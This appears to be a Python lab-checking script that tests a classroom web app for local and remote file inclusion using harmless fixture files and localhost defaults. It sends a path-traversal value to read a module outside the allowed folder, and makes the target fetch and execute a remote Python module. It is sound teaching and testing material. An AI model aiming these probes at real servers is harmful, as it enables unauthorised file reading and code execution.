"""Reproduce LFI/RFI with harmless fixtures, without needing an LLM token."""

import argparse
import json
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from uuid import uuid4

import requests


def _validate_url(url):
    parsed = urlsplit(url)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("Use an http:// or https:// lab URL")


def _request(url, params, timeout):
    try:
        response = requests.get(url, params=params, timeout=timeout,
                                allow_redirects=False)
    except requests.RequestException as exc:
        return {"url": url, "params": params, "error": str(exc)}
    try:
        body = response.json()
    except ValueError:
        body = None
    return {
        "url": response.url,
        "params": params,
        "status_code": response.status_code,
        "content": body.get("content") if isinstance(body, dict) else None,
        "body_excerpt": response.text[:1000],
    }


def scan_lab(base_url, remote_payload_url, lfi_endpoint="/api/lfi",
             rfi_endpoint="/api/rfi", timeout=10):
    """Check this lab, using its known fixtures; not a general-purpose scanner.

    remote_payload_url must be reachable FROM THE TARGET, not just the scanner.
    No finding is confirmed by an HTTP code, a filename, or an error alone.
    """
    _validate_url(base_url)
    _validate_url(remote_payload_url)
    for endpoint in (lfi_endpoint, rfi_endpoint):
        if not endpoint.startswith("/") or endpoint.startswith("//"):
            raise ValueError("Endpoints must be local paths starting with /")
    base_url = base_url.rstrip("/")

    baseline = _request(base_url + lfi_endpoint,
                        {"file": "welcome.py"}, timeout)
    local = _request(base_url + lfi_endpoint,
                     {"file": "../fi_private_page.py"}, timeout)
    lfi_confirmed = (
        baseline.get("status_code") == 200
        and baseline.get("content") == "WELCOME_FILE_INCLUSION_LAB"
        and local.get("status_code") == 200
        and local.get("content") == "LFI_PRIVATE_FIXTURE:42"
    )

    nonce = uuid4().hex
    parsed = urlsplit(remote_payload_url)
    query = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)
             if k != "nonce"]
    query.append(("nonce", nonce))
    payload_url = urlunsplit(parsed._replace(query=urlencode(query), fragment=""))
    remote = _request(base_url + rfi_endpoint, {"url": payload_url}, timeout)
    expected = f"RFI_EXECUTED:{nonce}:42"
    rfi_confirmed = (
        remote.get("status_code") == 200 and remote.get("content") == expected
    )

    return {
        "target": base_url,
        "scope": "Known classroom fixtures only; negative results are not a security guarantee.",
        "checks": [
            {
                "type": "LFI",
                "status": "confirmed" if lfi_confirmed else "requires_verification",
                "severity": "HIGH",
                "location": lfi_endpoint,
                "evidence": {"baseline": baseline, "payload_response": local},
                "reason": ("A module outside fi_pages/ was included and computed the private fixture marker."
                           if lfi_confirmed else "The baseline and private module proof did not both match; inspect evidence."),
                "recommendation": "Select trusted modules using a fixed allowlist; never turn user input into a module path.",
            },
            {
                "type": "RFI",
                "status": "confirmed" if rfi_confirmed else "requires_verification",
                "severity": "CRITICAL",
                "location": rfi_endpoint,
                "evidence": {"payload_response": remote, "expected_execution_result": expected},
                "reason": ("The remote Python module executed and computed the fresh nonce-bound result."
                           if rfi_confirmed else "Remote execution was not demonstrated; check target-to-fixture connectivity and response."),
                "recommendation": "Disable user-controlled remote code inclusion; fetch data without evaluating it as code.",
            },
        ],
    }


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://127.0.0.1:5101")
    parser.add_argument("--remote-url", default="http://127.0.0.1:5102/payload.py",
                        help="Fixture URL reachable from the target")
    parser.add_argument("--lfi-endpoint", default="/api/lfi")
    parser.add_argument("--rfi-endpoint", default="/api/rfi")
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()
    try:
        report = scan_lab(args.url, args.remote_url,
                          args.lfi_endpoint, args.rfi_endpoint)
    except ValueError as exc:
        parser.error(str(exc))
    output = json.dumps(report, ensure_ascii=False, indent=2)
    print(output)
    if args.output:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(output + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
